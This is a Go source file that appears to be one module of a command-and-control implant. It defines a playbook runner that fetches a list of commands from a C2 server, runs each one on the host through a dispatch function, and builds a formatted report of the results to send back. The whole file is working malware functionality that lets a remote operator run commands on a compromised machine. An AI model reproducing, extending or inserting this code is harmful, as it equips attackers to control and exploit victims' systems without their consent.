package main

// Phase 10 — Playbook Runner
//   Fetches a playbook definition from the C2 server and executes steps
//   sequentially. Each step's output is captured and formatted in the combined
//   result that is sent back as a single task result.

import (
	"encoding/json"
	"fmt"
	"io"
	"strings"
)

type PlaybookStep struct {
	ID      string `json:"id"`
	Name    string `json:"name"`
	Command string `json:"command"`
	OnFail  string `json:"on_fail"` // "abort" | "continue"
}

type PlaybookDef struct {
	ID          string         `json:"id"`
	Name        string         `json:"name"`
	Description string         `json:"description"`
	Steps       []PlaybookStep `json:"steps"`
}

// runPlaybook fetches playbook <id> from the server and executes all steps.
func runPlaybook(playbookID string) (string, string) {
	url := C2URL + "/api/playbooks/" + playbookID
	resp, err := client.Get(url)
	if err != nil {
		return "Failed to fetch playbook: " + err.Error(), "failed"
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "Failed to read playbook response: " + err.Error(), "failed"
	}

	if resp.StatusCode != 200 {
		return fmt.Sprintf("Playbook fetch failed (HTTP %d): %s", resp.StatusCode, string(body)), "failed"
	}

	var pb PlaybookDef
	if err := json.Unmarshal(body, &pb); err != nil {
		return "Failed to parse playbook: " + err.Error(), "failed"
	}

	if len(pb.Steps) == 0 {
		return fmt.Sprintf("Playbook '%s' has no steps defined", pb.Name), "failed"
	}

	var result strings.Builder
	result.WriteString(fmt.Sprintf("╔══════════════════════════════════════════\n"))
	result.WriteString(fmt.Sprintf("║ PLAYBOOK: %s\n", pb.Name))
	if pb.Description != "" {
		result.WriteString(fmt.Sprintf("║ %s\n", pb.Description))
	}
	result.WriteString(fmt.Sprintf("║ Steps: %d\n", len(pb.Steps)))
	result.WriteString(fmt.Sprintf("╚══════════════════════════════════════════\n\n"))

	completed := 0
	failed := 0
	aborted := false

	for i, step := range pb.Steps {
		result.WriteString(fmt.Sprintf("┌─ [%d/%d] %s\n", i+1, len(pb.Steps), step.Name))
		result.WriteString(fmt.Sprintf("│  CMD: %s\n", step.Command))

		out, status := dispatch(step.Command)
		result.WriteString(fmt.Sprintf("│  STATUS: %s\n", status))

		if out != "" {
			lines := strings.Split(strings.TrimRight(out, "\n"), "\n")
			for _, line := range lines {
				result.WriteString(fmt.Sprintf("│  %s\n", line))
			}
		}
		result.WriteString("│\n")

		if status == "completed" {
			completed++
		} else {
			failed++
			onFail := step.OnFail
			if onFail == "" {
				onFail = "abort"
			}
			if onFail == "abort" {
				result.WriteString(fmt.Sprintf("└─ [!] ABORTED at step %d (on_fail=abort)\n\n", i+1))
				aborted = true
				break
			}
		}
		result.WriteString(fmt.Sprintf("└─ done\n\n"))
	}

	result.WriteString(fmt.Sprintf("══════════════════════════════════════════\n"))
	result.WriteString(fmt.Sprintf("SUMMARY: %d completed, %d failed", completed, failed))
	if aborted {
		result.WriteString(" — ABORTED")
	}
	result.WriteString("\n")

	return result.String(), "completed"
}
